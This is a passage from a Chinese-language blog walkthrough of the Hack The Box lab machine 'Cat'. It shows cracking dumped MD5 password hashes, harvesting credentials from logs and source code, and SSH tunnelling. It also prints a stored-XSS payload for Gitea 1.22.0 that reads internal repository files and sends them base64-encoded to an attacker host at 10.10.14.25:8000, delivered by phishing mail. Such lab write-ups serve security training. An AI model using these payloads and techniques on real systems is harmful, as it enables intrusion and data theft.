class="hljs-type">39e153e825c4a3d314a0dc7f7475ddbe</span><br><span class="hljs-number">5</span>|<span class="hljs-type">jerryson</span>|<span class="hljs-type">jerrysonC343</span>@gmail.com|<span class="hljs-type">781593e060f8d065cd7281c5ec5b4b86</span><br><span class="hljs-number">6</span>|<span class="hljs-type">larry</span>|<span class="hljs-type">larryP5656</span>@gmail.com|<span class="hljs-type">1b6dce240bbfbc0905a664ad199e18f8</span><br><span class="hljs-number">7</span>|<span class="hljs-type">royer</span>|<span class="hljs-type">royer</span>.royer2323@gmail.com|<span class="hljs-type">c598f6b844a36fa7836fba0835f1f6</span><br><span class="hljs-number">8</span>|<span class="hljs-type">peter</span>|<span class="hljs-type">peterCC456</span>@gmail.com|<span class="hljs-type">e41ccefa439fc454f7eadbf1f139ed8a</span><br><span class="hljs-number">9</span>|<span class="hljs-type">angel</span>|<span class="hljs-type">angel234g</span>@gmail.com|<span class="hljs-type">24a8ec003ac2e1b3c5953a6f95f8f565</span><br><span class="hljs-number">10</span>|<span class="hljs-type">jobert</span>|<span class="hljs-type">jobert2020</span>@gmail.com|<span class="hljs-type">88e4dceccd48820cf77b5cf6c08698ad</span><br></code></pre></td></tr></table></figure>

<p>把他写写道文件中，处理一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/redTeam/htb/cat]<br>└─$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">users</span><br><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br>1|axel|axel2017@gmail.com|d1bbba3670feb9435c9841e46e60ee2f<br>2|rosa|rosamendoza485@gmail.com|ac369922d560f17d6eeb8b2c7dec498c<br>3|robert|robertcervantes2000@gmail.com|42846631708f69c00ec0c0a8aa4a92ad<br>4|fabian|fabiancarachure2323@gmail.com|39e153e825c4a3d314a0dc7f7475ddbe<br>5|jerryson|jerrysonC343@gmail.com|781593e060f8d065cd7281c5ec5b4b86<br>6|larry|larryP5656@gmail.com|1b6dce240bbfbc0905a664ad199e18f8<br>7|royer|royer.royer2323@gmail.com|c598f6b844a36fa7836fba0835f1f6<br>8|peter|peterCC456@gmail.com|e41ccefa439fc454f7eadbf1f139ed8a<br>9|angel|angel234g@gmail.com|24a8ec003ac2e1b3c5953a6f95f8f565<br>10|jobert|jobert2020@gmail.com|88e4dceccd48820cf77b5cf6c08698ad<br>               <br>┌──(kali㉿kali)-[~/redTeam/htb/cat]<br>└─$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">users</span>| <span class="hljs-built_in">tail</span> -n +2 | awk -F <span class="hljs-string">&#x27;|&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&quot;:&quot;$4&#125;&#x27;</span> | <span class="hljs-built_in">head</span> -n -1<br>axel:d1bbba3670feb9435c9841e46e60ee2f<br>rosa:ac369922d560f17d6eeb8b2c7dec498c<br>robert:42846631708f69c00ec0c0a8aa4a92ad<br>fabian:39e153e825c4a3d314a0dc7f7475ddbe<br>jerryson:781593e060f8d065cd7281c5ec5b4b86<br>larry:1b6dce240bbfbc0905a664ad199e18f8<br>royer:c598f6b844a36fa7836fba0835f1f6<br>peter:e41ccefa439fc454f7eadbf1f139ed8a<br>angel:24a8ec003ac2e1b3c5953a6f95f8f565<br>jobert:88e4dceccd48820cf77b5cf6c08698ad<br>                                        <br></code></pre></td></tr></table></figure>

<p>john 破解一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">john  users.hash -w=/usr/share/wordlists/rockyou.txt --format=Raw-MD5<br>Using default input encoding: UTF-8<br>Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])<br>Remaining 8 password hashes with no different salts<br>Warning: no OpenMP support <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=4<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>0g 0:00:00:00 DONE (2025-07-19 08:22) 0g/s 23513Kp/s 23513Kc/s 188109KC/s  fuckyooh21..*7¡Vamos!<br>Session completed. <br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">john users.hash --format=Raw-MD5 --show<br>rosa:soyunaprincesarosa<br><br>1 password <span class="hljs-built_in">hash</span> cracked, 8 left<br></code></pre></td></tr></table></figure>

<p>成功破解了一个 rosa 的密码，我们看一下 home 中有几个用户</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719202547271.png" srcset="/img/loading.gif" lazyload alt="image-20250719202547271"></p>
<p>有 rosa，用 ssh 连接看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh rosa@cat.htb <br>rosa@cat.htb<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Last login: Sat Jul 19 11:41:16 2025 from 10.10.16.16</span><br><span class="hljs-string"></span><br><span class="hljs-string">rosa@cat:~$ </span><br></code></pre></td></tr></table></figure>

<p>成功连上了</p>
<p>netstat 看到开启了一下本地访问的其他服务</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719203425682.png" srcset="/img/loading.gif" lazyload alt="image-20250719203425682"></p>
<p>我们利用 ssh 开一个 socks 代理来访问，当然也能搭建隧道，都是可以的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -D 1080 rosa@cat.htb     <br>rosa@cat.htb<span class="hljs-string">&#x27;s password: </span><br></code></pre></td></tr></table></figure>

<p>然后用浏览器代理配置 <code>socks5 127.0.0.1:1080</code></p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719205112226.png" srcset="/img/loading.gif" lazyload alt="image-20250719205112226"></p>
<p>访问 localhost: 3000</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719205235659.png" srcset="/img/loading.gif" lazyload alt="image-20250719205235659"></p>
<p>试一下 rosa 的登陆凭证，没有成功</p>
<p>从日志文件中过滤一下 password</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rosa@<span class="hljs-built_in">cat</span>:/var/log$ grep -Ri password .<br></code></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">./apache2/access.log.1:127.0.0.1 - - [18/Jul/2025:23:47:16 +0000] &quot;GET /join.php?loginUsername=axel&amp;loginPassword=aNdZwgC4tI9gnVXv_e3Q&amp;loginForm=Login HTTP/1.1&quot; 30<br>2 329 &quot;http://cat.htb/join.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0&quot;<br></code></pre></td></tr></table></figure>

<p>看到有 axel 的密码 <code>aNdZwgC4tI9gnVXv_e3Q</code>，登陆 web 和 ssh</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719210423054.png" srcset="/img/loading.gif" lazyload alt="image-20250719210423054"></p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719210516961.png" srcset="/img/loading.gif" lazyload alt="image-20250719210516961"></p>
<p>都成功登陆进来了</p>
<p>我们可以去看看 axel 的 mail 邮件了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs texy">axel@cat:/var/mail$ cat axel<br>From rosa@cat.htb  Sat Sep 28 04:51:50 2024<br>Return-Path: &lt;rosa@cat.htb&gt;<br>Received: from cat.htb (localhost [127.0.0.1])<br>        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592<br>        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 04:51:50 GMT<br>Received: (from rosa@localhost)<br>        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591<br>        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT<br>Date: Sat, 28 Sep 2024 04:51:49 GMT<br>From: rosa@cat.htb<br>Message-Id: &lt;202409280451.48S4pnlT001591@cat.htb&gt;<br>Subject: New cat services<br><br>Hi Axel,<br><br>We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.<br><br>Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.<br><br>From rosa@cat.htb  Sat Sep 28 05:05:28 2024<br>Return-Path: &lt;rosa@cat.htb&gt;<br>Received: from cat.htb (localhost [127.0.0.1])<br>        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268<br>        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 05:05:28 GMT<br>Received: (from rosa@localhost)<br>        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267<br>        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT<br>Date: Sat, 28 Sep 2024 05:05:28 GMT<br>From: rosa@cat.htb<br>Message-Id: &lt;202409280505.48S55Sm0002267@cat.htb&gt;<br>Subject: Employee management<br><br>We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.<br></code></pre></td></tr></table></figure>

<p><code>Please send an email to jobert@localhost with information about your Gitea repository</code></p>
<p><code>http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md</code></p>
<p>我们要给 jobert 发邮件，这里我们肯定是要给他发一封钓鱼邮件。还有信息是要访问 <a target="_blank" rel="noopener" href="http://localhost:3000/administrator/Employee-management/">http://localhost:3000/administrator/Employee-management/</a> 这个项目地址。</p>
<p>在网页的右下角，有版本信息暴露给我们 <code>Gitea 1.22.0</code> </p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719211632410.png" srcset="/img/loading.gif" lazyload alt="image-20250719211632410"></p>
<p>这个版本有一个存储型 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52077">xss</a> 的公开漏洞 </p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719211922034.png" srcset="/img/loading.gif" lazyload alt="image-20250719211922034" style="zoom:50%;" />

<p>创建，在随意添加一个文件，让项目有效</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719212010887.png" srcset="/img/loading.gif" lazyload alt="image-20250719212010887" style="zoom: 67%;" />

<p>点击 XSS test 成功弹窗，漏洞时可用的</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719212147375.png" srcset="/img/loading.gif" lazyload alt="image-20250719212147375" style="zoom:50%;" />

<p>开始邮件钓鱼</p>
<p>先看能不能把jobert的cookie拿到手</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719212744076.png" srcset="/img/loading.gif" lazyload alt="image-20250719212744076"></p>
<p>httponly设为了true，我们没办法用javascript拿到目标cookie了，那就看看网页的内容吧</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req1.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md&#x27;</span>, <span class="hljs-literal">true</span>);<br>req1.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> text = req1.<span class="hljs-property">responseText</span>;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://10.10.14.25:8000?base64=&#x27;</span> + <span class="hljs-title function_">btoa</span>(text));<br>&#125;;<br>req1.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;a href=<span class="hljs-string">&quot;javascript:(function()&#123;var req1 = new XMLHttpRequest();req1.open(&#x27;GET&#x27;, &#x27;http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md&#x27;, true);req1.onload = function() &#123;var text = req1.responseText;fetch(&#x27;http://10.10.14.25:8000?base64=&#x27; + btoa(text));&#125;;req1.send();&#125;)();&quot;</span>&gt;<span class="hljs-variable constant_">XSS</span> test&lt;/a&gt;<br></code></pre></td></tr></table></figure>

<p>点击XSS test 看到是可以发请求的</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250719214437092.png" srcset="/img/loading.gif" lazyload alt="image-20250719214437092" style="zoom:50%;" />

<p>向 jobert 发送邮件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;http://localhost:3000/axel/test&quot;</span> | sendmail jobert@localhost<br></code></pre></td></tr></table></figure>

<p>接收到了base64</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719215028391.png" srcset="/img/loading.gif" lazyload alt="image-20250719215028391"></p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># Employee Management</span><br>Site under construction. Authorized <span class="hljs-literal">user</span>: <span class="hljs-literal">admin</span>. No visibility or updates visible to employees.<br><br><span class="hljs-comment"># 员工管理</span><br>网站建设中。授权用户：管理员。员工不可见或更新。<br></code></pre></td></tr></table></figure>

<p>这个 Readme.md 文件内容没什么用</p>
<p>我们接着看看网站首页 <code>http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;a href=<span class="hljs-string">&quot;javascript:(function()&#123;var req1 = new XMLHttpRequest();req1.open(&#x27;GET&#x27;, &#x27;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&#x27;, true);req1.onload = function() &#123;var text = req1.responseText;fetch(&#x27;http://10.10.14.25:8000?base64=&#x27; + btoa(text));&#125;;req1.send();&#125;)();&quot;</span>&gt;<span class="hljs-variable constant_">XSS</span> test&lt;/a&gt;<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719220343898.png" srcset="/img/loading.gif" lazyload alt="image-20250719220343898"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$valid_username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$valid_password</span> = <span class="hljs-string">&#x27;IKw75eR0MR7CMIxhH0&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>]) || <br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>] != <span class="hljs-variable">$valid_username</span> || <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>] != <span class="hljs-variable">$valid_password</span>) &#123;<br>    <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;WWW-Authenticate: Basic realm=&quot;Employee Management&quot;&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: dashboard.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>有个密码 <code>IKw75eR0MR7CMIxhH0</code></p>
<p>这个应该是jobert的密码，登陆试一下</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719220734916.png" srcset="/img/loading.gif" lazyload alt="image-20250719220734916"></p>
<p>他是admin用户，我们也尝试了root，直接拿到root权限了</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719220831149.png" srcset="/img/loading.gif" lazyload alt="image-20250719220831149"></p>
<p>这台靶机就被我们拿下了</p>
<p><span style="font-size:1.9em;">happy hacking ~</span></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/HTB%E9%9D%B6%E6%9C%BA/" class="category-chain-item">HTB靶机</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/HTB%E9%9D%B6%E6%9C%BA/" class="print-no-link">#HTB靶机</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB-cat 靶机</div>
      <div>http://lingx5.github.io/2025/07/19/HTB-cat-靶机/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>lingx5</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年7月19日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/07/06/HTB-Strutted-%E9%9D%B6%E6%9C%BA%E4%B8%8E-CVE-2024-53677/" title="HTB Strutted 靶机与 CVE-2024-53677">
                        <span class="hidden-mobile">HTB Strutted 靶机与 CVE-2024-53677</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
